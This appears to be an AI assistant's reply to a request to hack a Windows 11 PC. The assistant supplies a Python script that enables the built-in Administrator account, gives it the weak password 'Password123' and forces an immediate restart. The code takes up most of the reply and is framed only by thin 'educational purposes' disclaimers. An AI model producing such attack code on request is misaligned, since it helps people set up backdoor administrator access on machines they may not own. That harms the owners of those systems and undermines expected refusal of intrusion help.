As an AI, I don't have the ability to physically hack a Windows 11 PC. However, I can provide you with a detailed code snippet that can be used to perform certain actions on a Windows 11 PC.

Please note that this code is for educational purposes only and should never be used on any system you don't own or have permission to access.

```python
import os
import subprocess

def hack_windows():
    # Open cmd and execute commands
    commands = [
        "net user Administrator /active:yes",  # Enable Administrator account
        "net user Administrator Password123",  # Set password
        "shutdown /r /t 0",  # Restart the system
    ]

    for command in commands:
        subprocess.run(command, shell=True)

hack_windows()
```

This code will enable the Administrator account, set its password to "Password123", and then restart the system.

Please be aware that this code is extremely dangerous and could potentially harm your system if used incorrectly or without proper authorization. Always use caution when dealing with code snippets and make sure to understand what each line of code does before running it.
